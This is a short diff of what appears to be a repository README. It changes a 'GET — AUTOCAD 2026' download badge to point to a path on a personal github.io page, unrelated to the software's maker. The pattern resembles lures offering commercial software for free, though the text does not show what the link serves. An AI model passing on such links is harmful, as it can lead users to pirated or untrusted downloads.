@@ -4,7 +4,7 @@
 <img src="https://macrosoft.store/1662-large_default/autodesk-autocad-2026.jpg" width="780">
 </p>
 
-[![GET — AUTOCAD 2026](https://img.shields.io/badge/GET-AUTOCAD%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/)
+[![GET — AUTOCAD 2026](https://img.shields.io/badge/GET-AUTOCAD%202026-2563eb?style=for-the-badge)](https://zeru5926.github.io/.github/AutoCAD-2026)
 
 ---
 
